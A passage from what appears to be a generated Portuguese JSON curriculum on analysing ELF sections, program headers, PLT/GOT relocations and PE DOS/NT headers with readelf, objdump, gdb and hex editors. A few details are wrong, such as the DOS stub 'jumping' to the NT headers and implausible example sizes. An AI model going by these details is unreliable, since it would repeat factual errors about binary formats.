                                  "subSteps": [
                                    "Descreva .text: contém código executável, flags r/x, offset após cabeçalhos.",
                                    "Explique .data: dados inicializados (variáveis globais), flags r/w.",
                                    "Detalhe .bss: dados não inicializados (zero-filled em runtime), flags r/w, sem dados no arquivo.",
                                    "Aborde .symtab: tabela de símbolos com nomes e tipos, linkada a .strtab.",
                                    "Descreva .strtab: strings para símbolos e nomes de seções."
                                  ],
                                  "verification": "Liste as 5 seções com suas flags de permissão e propósitos em uma tabela.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Referência ELF spec (toolchain docs), exemplos de readelf -S em binários simples.",
                                  "tips": "Memorize flags: PF_R (read), PF_W (write), PF_X (execute) mapeadas para seções.",
                                  "learningObjective": "Diferenciar propósitos, conteúdos e permissões das seções comuns.",
                                  "commonMistakes": "Achar que .bss ocupa espaço no arquivo; ela só tem tamanho reservado."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Offsets, Tamanhos e Flags na Tabela de Seções",
                                  "subSteps": [
                                    "Use readelf -S para extrair sh_offset (posição no arquivo), sh_size (tamanho) e sh_flags.",
                                    "Calcule posições: offset + size para próxima seção, alinhamentos (sh_addralign).",
                                    "Interprete flags: combinações como SHF_ALLOC (carregada em memória), SHF_EXECINSTR (executável).",
                                    "Compare sh_addr (endereço virtual) com sh_offset (arquivo) para relocação.",
                                    "Verifique integridade somando tamanhos para matching do arquivo size."
                                  ],
                                  "verification": "Para um binário dado, anote offsets/tamanhos de .text/.data e some para validar.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Comando readelf/objdump, binário ELF como 'gcc -o hello hello.c'.",
                                  "tips": "Hexdump offsets para visualizar: xxd -s <offset> -l <size> file.",
                                  "learningObjective": "Interpretar metadados quantitativos e qualitativos das seções.",
                                  "commonMistakes": "Ignorar alinhamentos causando miscalculations de offsets."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Descrição Completa Usando Ferramentas de Análise",
                                  "subSteps": [
                                    "Execute readelf -h -S -s em um binário para ver cabeçalho, seções e símbolos.",
                                    "Descreva verbalmente: 'Seção .text em offset 0x400, size 0x200, flags r-x'.",
                                    "Use objdump -h para headers e -d para disassemble .text.",
                                    "Identifique .symtab/.strtab e liste 3 símbolos com strings.",
                                    "Gere relatório resumindo todas seções principais."
                                  ],
                                  "verification": "Escreva um relatório de 1 página descrevendo seções de um binário real.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Terminal Linux, binários como /bin/ls ou hello world compilado, readelf/objdump.",
                                  "tips": "Salve output em arquivo: readelf -S file.elf > sections.txt para análise.",
                                  "learningObjective": "Aplicar conhecimento para descrever seções em binários reais.",
                                  "commonMistakes": "Não decodificar flags corretamente; use readelf --section-headers para legível."
                                }
                              ],
                              "practicalExample": "Compile 'gcc -static -o hello_static hello.c', execute 'readelf -S hello_static'. Descreva: .text (offset 0x450, size 0x120, r-x), .data (offset 0x5d0, size 0x10, rw), .bss (offset 0x5e0, size 0x20, rw), .symtab (offset 0x2000, size 0x500), .strtab (offset 0x2500, size 0x300). Explique como offsets permitem extração precisa.",
                              "finalVerifications": [
                                "Lista corretamente offsets, tamanhos e flags de .text, .data, .bss, .symtab, .strtab.",
                                "Explica papel da .shstrtab em nomes de seções.",
                                "Interpreta flags SHF_ALLOC e SHF_EXECINSTR em exemplos.",
                                "Valida layout somando tamanhos de seções principais.",
                                "Descreve tabela de seções via readelf sem erros.",
                                "Diferencia seções carregadas (.text) de metadados (.symtab)."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de pelo menos 5 seções principais (90% correto).",
                                "Correta interpretação de flags r/w/x e SHF_* (sem confusões).",
                                "Cálculo exato de offsets/tamanhos em binário analisado.",
                                "Relatório claro com exemplos de readelf output explicados.",
                                "Identificação de erros comuns como .bss não ocupando espaço.",
                                "Conexão entre tabela de seções e execução/carregamento."
                              ],
                              "crossCurricularConnections": [
                                "Linguagem Assembly: .text contém instruções analisadas em disassembly.",
                                "Sistemas Operacionais: Loaders usam seções para mmap com flags de proteção.",
                                "Segurança Computacional: Exploração via ROP em .text/.data.",
                                "Compiladores: Linking popula .symtab/.strtab.",
                                "Engenharia Reversa: Ferramentas como Ghidra leem ELF seções."
                              ],
                              "realWorldApplication": "Em análise de malware, descrever seções ELF revela injeções em .text ou C2 em .data; em debugging, verifica corrupção via offsets; em hardening, auditoria de flags W/X para mitigar exploits."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.1.3",
                            "name": "Analisar programa headers e segmentos ELF",
                            "description": "Interpretar a tabela de programa headers (PT_LOAD, PT_DYNAMIC, PT_INTERP), que definem como carregar o binário na memória, incluindo virtual address, physical address, tamanho em arquivo e memória, e alinhamentos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a Estrutura Geral dos Program Headers no ELF",
                                  "subSteps": [
                                    "Estude a seção ELF header para localizar o offset e o número de program headers (e_phoff e e_phnum).",
                                    "Revise os tipos comuns de program headers: PT_LOAD (carregamento de segmentos), PT_DYNAMIC (tabelas dinâmicas), PT_INTERP (interpretador como /lib/ld-linux.so).",
                                    "Analise os campos básicos de cada header: p_type, p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_flags, p_align.",
                                    "Desenhe um diagrama simples mostrando como os headers mapeiam seções do arquivo para a memória virtual.",
                                    "Compare p_filesz (tamanho no arquivo) com p_memsz (tamanho na memória, incluindo zeros para BSS)."
                                  ],
                                  "verification": "Crie um resumo escrito ou diagrama explicando os 8 campos principais de um program header.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação ELF oficial (man elf), editor de texto ou ferramenta de diagramação como draw.io"
                                  ],
                                  "tips": "Use cores diferentes no diagrama para distinguir arquivo vs. memória.",
                                  "learningObjective": "Identificar e descrever todos os campos principais de um program header ELF.",
                                  "commonMistakes": [
                                    "Confundir p_vaddr (virtual) com p_paddr (físico, raramente usado)",
                                    "Ignorar p_align para alinhamentos de página (tipicamente 0x1000)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Usar Ferramentas para Inspecionar Program Headers",
                                  "subSteps": [
                                    "Instale e execute 'readelf -l /bin/ls' para listar program headers.",
                                    "Interprete a saída: identifique PT_LOAD para código e dados, PT_DYNAMIC para símbolos, PT_INTERP para loader.",
                                    "Use 'objdump -p /bin/ls' para confirmar detalhes como virtual addresses e tamanhos.",
                                    "Compare saídas com 'hexdump -C /bin/ls | head' para validar offsets no arquivo.",
                                    "Extraia um header específico com 'dd if=/bin/ls bs=1 skip=<offset> count=32' e decode manualmente."
                                  ],
                                  "verification": "Gere a saída de readelf para um binário e anote os valores de p_vaddr, p_filesz e p_memsz para cada PT_LOAD.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "readelf, objdump (pacote binutils), binário ELF como /bin/ls ou hello world compilado"
                                  ],
                                  "tips": "Filtre com 'readelf -l arquivo | grep LOAD' para focar em segmentos carregáveis.",
                                  "learningObjective": "Executar comandos para extrair e listar program headers de um binário real.",
                                  "commonMistakes": [
                                    "Executar readelf sem flags corretas (-l para program headers)",
                                    "Confundir program headers com section headers (-S)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Interpretar Campos e Mapeamento na Memória",
                                  "subSteps": [
                                    "Para PT_LOAD: calcule o endereço base somando offsets virtuais e verifique alinhamentos (p_align).",
                                    "Analise PT_DYNAMIC: localize tags como DT_STRTAB para strings de símbolos.",
                                    "Para PT_INTERP: note o caminho do interpretador e seu papel no carregamento dinâmico.",
                                    "Simule carregamento: p_offset define leitura do arquivo, p_vaddr define posicionamento na memória, p_memsz inclui inicialização de zeros.",
                                    "Verifique flags (p_flags): PF_R (read), PF_W (write), PF_X (execute) para permissões de segmento."
                                  ],
                                  "verification": "Explique em um parágrafo como um PT_LOAD com p_vaddr=0x400000, p_filesz=0x1000, p_memsz=0x2000 é carregado.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Saída de readelf de um binário, calculadora hexadecimal ou Python para conversões"
                                  ],
                                  "tips": "Use 'xxd' ou hex editor para visualizar bytes exatos nos offsets.",
                                  "learningObjective": "Interpretar numericamente os campos e prever o layout na memória.",
                                  "commonMistakes": [
                                    "Assumir p_paddr sempre usado (é obsoleto em sistemas modernos)",
                                    "Ignorar que p_memsz > p_filesz requer zero-fill"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Segmentos e Integração com Outros Headers",
                                  "subSteps": [
                                    "Correlacione program headers com section headers usando readelf -l -S.",
                                    "Identifique como múltiplos PT_LOAD cobrem .text, .data, .bss etc.",
                                    "Teste modificação: altere um binário com hex editor (ex: mude PT_INTERP) e observe falhas no ld.so.",
                                    "Use gdb 'info proc mappings' em um processo rodando para ver mapeamentos reais.",
                                    "Documente diferenças entre static e dynamic ELF (mais PT_DYNAMIC no dinâmico)."
                                  ],
                                  "verification": "Crie um relatório comparando headers de um binário estático vs. dinâmico.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "gdb, hex editor como bless ou xxd, compiladores gcc com -static"
                                  ],
                                  "tips": "Compile 'gcc -static -o static_hello hello.c' para comparar.",
                                  "learningObjective": "Integrar análise de program headers com seções e runtime.",
                                  "commonMistakes": [
                                    "Não alinhar mudanças em p_align causando falhas de carregamento",
                                    "Confundir ordem de headers com ordem de carregamento"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando 'readelf -l /bin/ls', identifique o PT_INTERP apontando para '/lib64/ld-linux-x86-64.so.2', PT_LOAD com p_vaddr=0x400000 (p_filesz=1804KB, p_memsz=1805KB para código/dados), e PT_DYNAMIC em 0x2a3e28 definindo bibliotecas como libc.so.",
                              "finalVerifications": [
                                "Lista corretamente todos os program headers e seus tipos em um binário dado.",
                                "Explica diferenças entre p_filesz e p_memsz com exemplo numérico.",
                                "Identifica permissões (RXW) e alinhamentos corretamente.",
                                "Correlaciona PT_LOAD com regiões de memória esperadas em gdb.",
                                "Prevê falhas se um campo como p_vaddr for alterado.",
                                "Diferencia PT_DYNAMIC de PT_LOAD em propósitos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na decodificação de campos hexadecimais (90%+ correto).",
                                "Capacidade de mapear headers para layout de memória virtual.",
                                "Uso correto de ferramentas como readelf/objdump sem erros de sintaxe.",
                                "Identificação de 3+ tipos de headers e seus papéis específicos.",
                                "Análise de edge cases como binários estáticos.",
                                "Clareza em diagramas ou explicações escritas."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Mecanismos de carregamento de processos (mmap, execve).",
                                "Assembly/Arquitetura: Endereços virtuais e proteções de página (PTEs).",
                                "Segurança Computacional: ASLR, detecção de injeções via análise de segmentos.",
                                "Programação em C: Linkers e loaders (ld.so), símbolos dinâmicos.",
                                "Engenharia Reversa: Fundamento para ferramentas como IDA Pro ou Ghidra."
                              ],
                              "realWorldApplication": "Em análise de malware, reverse engineers usam essa skill para mapear código malicioso em memória, detectar packing (tamanhos discrepantes), ou explorar ASLR bypasses; também essencial em debugging de crashes de carregamento ou otimização de binários em embedded systems."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.1.4",
                            "name": "Explorar seções dinâmicas e relocações no ELF",
                            "description": "Identificar .dynamic (informações de linking dinâmico), .plt/.got (procedure linkage table e global offset table) e tabelas de relocação (.rel.dyn, .rela.plt) para entender chamadas de funções externas e resolução de símbolos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e analisar a seção .dynamic no ELF",
                                  "subSteps": [
                                    "Use readelf -d <arquivo> ou objdump -x <arquivo> para listar entradas dinâmicas.",
                                    "Localize tags como DT_NEEDED (bibliotecas dependentes), DT_SYMTAB (tabela de símbolos), DT_STRTAB (strings).",
                                    "Interprete o conteúdo: identifique o endereço base da seção .dynamic e seus tipos de tags (DT_XXX).",
                                    "Anote o offset e tamanho da seção .dynamic usando readelf -S <arquivo>.",
                                    "Compare com documentação ELF para validar interpretações de tags comuns."
                                  ],
                                  "verification": "Confirme listando pelo menos 5 tags DT_ relevantes e seus valores com readelf -d.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramenta readelf ou objdump",
                                    "Binário ELF dinâmico sample (ex: gcc -o test test.c onde test.c chama printf)"
                                  ],
                                  "tips": "Sempre use opções -d para dynamic section e -S para seções; foque em tags DT_REL e DT_RELA para ligar a relocações.",
                                  "learningObjective": "Compreender o papel da seção .dynamic como repositório de metadados para linking dinâmico.",
                                  "commonMistakes": [
                                    "Confundir .dynamic com .dynsym (símbolos vs metadados)",
                                    "Ignorar endianness ao interpretar valores hex",
                                    "Não verificar se o binário é PIE/PIC"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a Procedure Linkage Table (.plt)",
                                  "subSteps": [
                                    "Use readelf -r <arquivo> para ver relocações associadas à .plt.",
                                    "Examine o disassembly da .plt com objdump -d <arquivo> | grep plt.",
                                    "Identifique entradas PLT para funções externas (ex: printf@plt).",
                                    "Trace o stub de código: jmp *GOT + offset seguido de push index e jmp resolver.",
                                    "Use gdb para set breakpoint na .plt e observar chamadas lazy binding."
                                  ],
                                  "verification": "Descreva o fluxo de uma chamada PLT: stub -> GOT -> resolver, com exemplo de disassembly.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "objdump",
                                    "gdb",
                                    "Binário ELF com chamadas externas"
                                  ],
                                  "tips": "Compile com -no-pie para endereços absolutos mais simples; use 'info proc mappings' no gdb para ver seções carregadas.",
                                  "learningObjective": "Entender como .plt media chamadas lazy para funções externas via stubs de resolução.",
                                  "commonMistakes": [
                                    "Achar que .plt contém código real das funções (são apenas stubs)",
                                    "Ignorar o papel do linker ld.so",
                                    "Confundir PLT com PLTgot"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar a Global Offset Table (.got)",
                                  "subSteps": [
                                    "Localize .got e .got.plt com readelf -S <arquivo>.",
                                    "Examine conteúdo com objdump -s -j .got <arquivo> ou hexdump.",
                                    "Identifique entradas: lazy (inicialmente resolver), eager resolvidas.",
                                    "Correlacione com relocações: readelf -r -a <arquivo> filtrando por .got.plt.",
                                    "Modifique uma entrada GOT no gdb (set {int}0xaddr = valor) e observe impacto."
                                  ],
                                  "verification": "Liste 3 entradas .got.plt e explique seu estado inicial vs resolvido.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "readelf",
                                    "objdump",
                                    "gdb",
                                    "Hex editor opcional como xxd"
                                  ],
                                  "tips": "GOT é writable; em ASLR, endereços variam – use gdb para runtime view.",
                                  "learningObjective": "Dominar como .got armazena endereços resolvidos de símbolos externos.",
                                  "commonMistakes": [
                                    "Confundir .got com .data (GOT é dedicada a pointers resolvidos)",
                                    "Não notar separação .got vs .got.plt",
                                    "Ler valores estáticos sem considerar runtime"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Examinar tabelas de relocação (.rel.dyn, .rela.plt) e fluxo de resolução",
                                  "subSteps": [
                                    "Use readelf -r <arquivo> para listar .rel.dyn e .rela.plt.",
                                    "Parse entradas: offset, type (R_X86_64_GLOB_DAT, etc.), symbol index.",
                                    "Correlacione relocações com símbolos via .dynsym: readelf -s <arquivo>.",
                                    "Simule resolução: explique como ld.so processa .rela.plt durante lazy binding.",
                                    "Teste com LD_DEBUG=reloc ./test para ver logs de relocação em runtime."
                                  ],
                                  "verification": "Explique uma entrada .rela.plt completa e como ela resolve um símbolo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "readelf",
                                    "LD_DEBUG env var",
                                    "Binário com múltiplas libs (ex: link com -lm)"
                                  ],
                                  "tips": "Defina LD_DEBUG=bind|reloc|libs para verbose output; foque em tipos R_* relevantes por arch.",
                                  "learningObjective": "Integrar relocações ao processo de resolução de símbolos dinâmicos.",
                                  "commonMistakes": [
                                    "Misturar rel.dyn (runtime) com rela.plt (lazy)",
                                    "Ignorar addend em RELA",
                                    "Não mapear symbol index para nomes reais"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'test.c': #include <stdio.h> int main() { printf(\"Hello\\n\"); return 0; } com gcc -o test test.c -no-pie. Use readelf -a test para identificar .dynamic (DT_NEEDED libc), .plt (printf@plt), .got.plt (entradas para printf), e .rela.plt (reloc R_X86_64_JUMP_SLOT para printf@GLIBC). Rode com LD_DEBUG=reloc para ver resolução lazy.",
                              "finalVerifications": [
                                "Lista corretamente offsets e tamanhos de .dynamic, .plt, .got, .rel.dyn/.rela.plt.",
                                "Explica lazy vs eager binding com exemplo de stub PLT.",
                                "Parse uma entrada de relocação completa (offset, type, sym).",
                                "Descreve fluxo: call plt -> GOT check -> resolver se necessário.",
                                "Demonstra com gdb ou LD_DEBUG a resolução runtime de um símbolo.",
                                "Identifica pelo menos 3 tags DT_ em .dynamic e seu propósito."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de seções e tags (sem erros de interpretação).",
                                "Profundidade na explicação de fluxos PLT/GOT/reloc (inclui assembly snippets).",
                                "Capacidade de correlacionar seções (ex: reloc aponta para GOT entry).",
                                "Uso correto de ferramentas (readelf opts, gdb breakpoints).",
                                "Compreensão de implicações (lazy binding, writability de GOT).",
                                "Exemplo prático reproduzível e análise completa."
                              ],
                              "crossCurricularConnections": [
                                "Assembly Language: Disassembly de stubs PLT e instruções de jump indireto.",
                                "Operating Systems: Loaders dinâmicos (ld.so) e memory mapping de seções.",
                                "Computer Security: Exploração GOT/PLT em ROP, GOT overwrite attacks.",
                                "Compilers: Geração de PIC/PIE e flags de linking (-fPIC, -shared).",
                                "Reverse Engineering: Ferramentas como Ghidra/IDA para análise ELF avançada."
                              ],
                              "realWorldApplication": "Em análise de malware reversa, identificar relocações dinâmicas revela imports suspeitos e hooks em GOT para detecção de rootkits; em debugging, trace PLT para issues de linking; em otimização, analisar .dynamic para reduzir dependências desnecessárias em binários embarcados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.5.2",
                        "name": "Formato PE (Windows)",
                        "description": "Estrutura detalhada do Portable Executable (PE) format, incluindo cabeçalhos DOS, NT, seções e tabelas usadas em executáveis Windows gerados na compilação.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.2.1",
                            "name": "Identificar cabeçalho DOS e stub no PE",
                            "description": "Reconhecer a assinatura 'MZ', offset para NT headers (e_lfanew), e o stub executável de 16 bits que exibe mensagem de 'This program cannot be run in DOS mode'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura inicial do cabeçalho DOS em um arquivo PE",
                                  "subSteps": [
                                    "Abra um editor hexadecimal como HxD ou um disassembler como IDA Pro para visualizar um arquivo executável PE (.exe) válido.",
                                    "Examine os primeiros bytes do arquivo para identificar a seção de cabeçalho DOS.",
                                    "Leia a documentação do formato PE para entender que o cabeçalho DOS é um resquício de compatibilidade com MS-DOS.",
                                    "Identifique o tamanho típico do cabeçalho DOS (geralmente 0x40 a 0x80 bytes).",
                                    "Anote a posição dos campos principais, como o offset e_lfanew no final do cabeçalho."
                                  ],
                                  "verification": "Confirme que você pode localizar os primeiros 64 bytes e identificar o propósito do cabeçalho DOS.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor hexadecimal (HxD, 010 Editor)",
                                    "Arquivo PE de exemplo (ex: notepad.exe)",
                                    "Documentação Microsoft PE/COFF"
                                  ],
                                  "tips": "Sempre comece do byte 0; use busca por strings para auxiliar na navegação inicial.",
                                  "learningObjective": "Entender o papel histórico e funcional do cabeçalho DOS no formato PE moderno.",
                                  "commonMistakes": [
                                    "Confundir com assinatura ELF (0x7F 'ELF')",
                                    "Ignorar o contexto de compatibilidade DOS",
                                    "Não verificar o tamanho exato do cabeçalho"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e validar a assinatura 'MZ' no cabeçalho DOS",
                                  "subSteps": [
                                    "Posicione o cursor nos bytes 0x00 e 0x01 do arquivo PE.",
                                    "Verifique se os bytes correspondem a '4D 5A' em hexadecimal (equivalente a 'MZ' em ASCII).",
                                    "Compare com múltiplos arquivos PE para confirmar consistência.",
                                    "Use uma ferramenta de busca hexadecimal para localizar 'MZ' e valide que está no início.",
                                    "Registre o significado: 'MZ' homenageia Mark Zbikowski, arquiteto do DOS."
                                  ],
                                  "verification": "A assinatura 'MZ' é encontrada exatamente nos bytes iniciais; teste em pelo menos 3 arquivos PE.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Editor hexadecimal",
                                    "Vários arquivos .exe Windows",
                                    "Referência PE format (ReactOS ou Microsoft docs)"
                                  ],
                                  "tips": "Ative a visualização ASCII no editor para ver 'MZ' claramente ao lado dos hex bytes.",
                                  "learningObjective": "Reconhecer a assinatura única que distingue arquivos PE válidos.",
                                  "commonMistakes": [
                                    "Ler em little-endian incorretamente",
                                    "Confundir com outros magic numbers como 'PE\\0\\0'",
                                    "Não validar em arquivos corrompidos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Localizar o offset e_lfanew para os cabeçalhos NT",
                                  "subSteps": [
                                    "Navegue para o offset 0x3C (60 em decimal) no cabeçalho DOS.",
                                    "Leia os 4 bytes nesse offset como um valor little-endian de 32 bits (ex: 0x000000F0).",
                                    "Converta o valor para decimal e salte para essa posição no arquivo.",
                                    "Valide que nessa posição encontra-se a assinatura 'PE\\0\\0' (50 45 00 00).",
                                    "Calcule e anote a distância entre MZ e NT headers para entender o espaço do stub."
                                  ],
                                  "verification": "O valor em 0x3C aponta corretamente para 'PE\\0\\0'; teste pulando e confirmando.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor hexadecimal com suporte a little-endian",
                                    "Disassembler como Ghidra ou x64dbg",
                                    "Exemplos de PE dumps"
                                  ],
                                  "tips": "Use calculadora hex para conversões; marque offsets com bookmarks no editor.",
                                  "learningObjective": "Dominar a navegação do cabeçalho DOS para acessar estruturas PE principais.",
                                  "commonMistakes": [
                                    "Ler big-endian em vez de little-endian",
                                    "Confundir offset com RVA",
                                    "Não validar a assinatura PE após o salto"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar o stub DOS executável e sua mensagem",
                                  "subSteps": [
                                    "Examine os bytes entre MZ (0x00) e e_lfanew para localizar código 16-bits e strings.",
                                    "Busque pela string 'This program cannot be run in DOS mode.' (geralmente por volta de 0x40-0x80).",
                                    "Use um disassembler 16-bit (como DOSBox com debug ou PCem) para analisar o stub como código executável.",
                                    "Execute o stub em ambiente DOS virtual para ver a mensagem exibida.",
                                    "Identifique o ponto de saída do stub que pula para os headers NT em modo protegido."
                                  ],
                                  "verification": "Localize a string exata e confirme que o stub executa imprimindo a mensagem em DOS.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Emulador DOS (DOSBox)",
                                    "Disassembler 16-bit (NDISASM)",
                                    "Arquivo PE com stub intacto"
                                  ],
                                  "tips": "Extraia o stub com ferramentas como CFF Explorer para análise isolada.",
                                  "learningObjective": "Entender o comportamento prático do stub como fallback de compatibilidade.",
                                  "commonMistakes": [
                                    "Executar stub em ambiente moderno sem emulação",
                                    "Ignorar strings codificadas",
                                    "Não diferenciar stub de padding"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando HxD em notepad.exe: Bytes 0-1 = 'MZ', offset 0x3C = 0x000001F8 apontando para 'PE\\0\\0', e bytes 0x70-0x9F contêm o stub com string 'This program cannot be run in DOS mode.' Execute em DOSBox para ver a mensagem.",
                              "finalVerifications": [
                                "Identifica 'MZ' nos bytes iniciais em qualquer PE válido.",
                                "Calcula corretamente e_lfanew e salta para NT headers.",
                                "Localiza a string do stub DOS em pelo menos 80% dos PE testados.",
                                "Explica o propósito do stub em compatibilidade.",
                                "Analisa stub em emulador sem erros.",
                                "Diferencia PE válido de corrompido via assinaturas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na localização de MZ e e_lfanew (100% correto).",
                                "Detalhe na descrição do stub e sua execução.",
                                "Uso correto de ferramentas e validação em múltiplos arquivos.",
                                "Compreensão conceitual (explicação histórica/funcional).",
                                "Identificação de erros comuns e avoidance.",
                                "Eficiência temporal (dentro dos estimates)."
                              ],
                              "crossCurricularConnections": [
                                "História da Computação: Evolução de DOS para Windows NT.",
                                "Engenharia Reversa: Técnicas de análise binária.",
                                "Segurança: Detecção de malwares com PE manipulado.",
                                "Arquitetura de Computadores: Diferenças 16-bit vs 32/64-bit.",
                                "Programação de Baixo Nível: Assembly 16-bit."
                              ],
                              "realWorldApplication": "Em análise de malware, identificar o cabeçalho DOS e stub ajuda a detectar PE packer/crypters ou injeções; em digital forensics, confirma integridade de executáveis Windows em investigações."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.2.2",
                            "name": "Interpretar NT Headers e Optional Header no PE",
                            "description": "Analisar PE signature ('PE\\0\\0'), file header (máquina, número de seções, timestamp, características), e optional header (magic, tamanho de código, entry point RVA, image base, subsystem).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e Validar a PE Signature no NT Headers",
                                  "subSteps": [
                                    "Abra um arquivo PE válido (ex: notepad.exe) em um hex editor como HxD.",
                                    "Vá para o offset 0x3C (60 em decimal) no DOS Header e leia o DWORD 'e_lfanew' que aponta para o início do NT Headers.",
                                    "Navegue para o offset indicado por e_lfanew.",
                                    "Verifique os 4 bytes iniciais: devem ser 50 45 00 00 (ASCII 'P','E','\\0','\\0').",
                                    "Confirme a signature e anote o offset base dos NT Headers."
                                  ],
                                  "verification": "Signature 'PE\\0\\0' confirmada no offset correto apontado por e_lfanew.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Hex editor (HxD ou 010 Editor)",
                                    "Amostra de PE válido (notepad.exe)",
                                    "Documentação MS PE/COFF"
                                  ],
                                  "tips": "Se e_lfanew for ~0xF8 em executáveis comuns, use isso como referência inicial.",
                                  "learningObjective": "Compreender a transição do DOS Stub para NT Headers via e_lfanew.",
                                  "commonMistakes": [
                                    "Ignorar o DOS Header e buscar 'PE' diretamente.",
                                    "Ler bytes em ordem errada (little-endian)."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Interpretar o COFF File Header",
                                  "subSteps": [
                                    "A partir do offset da signature +4, leia Machine (2 bytes): ex: 014C para x86, 8664 para x64.",
                                    "Leia NumberOfSections (2 bytes): indica quantas seções seguem.",
                                    "Leia TimeDateStamp (4 bytes): timestamp de compilação em UNIX time.",
                                    "Ignore PointerToSymbolTable e NumberOfSymbols (geralmente 0 em releases).",
                                    "Leia SizeOfOptionalHeader (2 bytes): tamanho do header seguinte (ex: 0xE0).",
                                    "Leia Characteristics (2 bytes): flags como IMAGE_FILE_EXECUTABLE_IMAGE (0x0002)."
                                  ],
                                  "verification": "Liste valores corretos: Machine, Sections, Timestamp, Characteristics interpretados.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Hex editor",
                                    "Calculadora hex/decimal",
                                    "Referência PE format (learn.microsoft.com)"
                                  ],
                                  "tips": "Converta hex para decimal/binário para flags; use little-endian sempre.",
                                  "learningObjective": "Analisar metadados básicos do executável no File Header.",
                                  "commonMistakes": [
                                    "Confundir ordem de campos.",
                                    "Interpretar flags sem bitwise AND."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Standard Optional Header",
                                  "subSteps": [
                                    "Após File Header, leia Magic (2 bytes): 0x10B (PE32), 0x20B (PE32+).",
                                    "Leia SizeOfCode (4 bytes): tamanho da seção .text em bytes alinhados.",
                                    "Leia AddressOfEntryPoint (4 bytes RVA): offset relativo da Base para entry point.",
                                    "Leia ImageBase (4 ou 8 bytes): endereço virtual preferido de load (ex: 0x400000).",
                                    "Localize e leia Subsystem (2 bytes, offset ~0x3C no Optional Header): 2=GUI, 3=Console."
                                  ],
                                  "verification": "Magic, SizeOfCode, EntryPoint RVA, ImageBase e Subsystem corretamente extraídos e explicados.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Hex editor",
                                    "PE sample",
                                    "PE specification PDF"
                                  ],
                                  "tips": "Some SizeOfOptionalHeader ao File Header para achar início; valide Magic primeiro.",
                                  "learningObjective": "Entender configuração de runtime e carregamento no Optional Header.",
                                  "commonMistakes": [
                                    "Pular campos de versão (Major/Minor Linker).",
                                    "Confundir RVA com offset de arquivo."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e Verificar Interpretação Completa",
                                  "subSteps": [
                                    "Compile um resumo: signature, File Header chave, Optional Header focado.",
                                    "Compare com ferramenta como CFF Explorer ou pefile Python para validação.",
                                    "Identifique anomalias: ex: ImageBase inválido em malware.",
                                    "Anote significado prático: EntryPoint para debugging, Subsystem para execução.",
                                    "Salve dump dos headers em tabela para referência."
                                  ],
                                  "verification": "Resumo matches tool output; anomalias detectadas se presentes.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "CFF Explorer ou Python com pefile",
                                    "Planilha para dump"
                                  ],
                                  "tips": "Use scripts Python para automação após manual: pefile.PE(data).OPTIONAL_HEADER.",
                                  "learningObjective": "Integrar análise para detecção de issues em PE files.",
                                  "commonMistakes": [
                                    "Não validar com tool.",
                                    "Ignorar endianness em multi-byte fields."
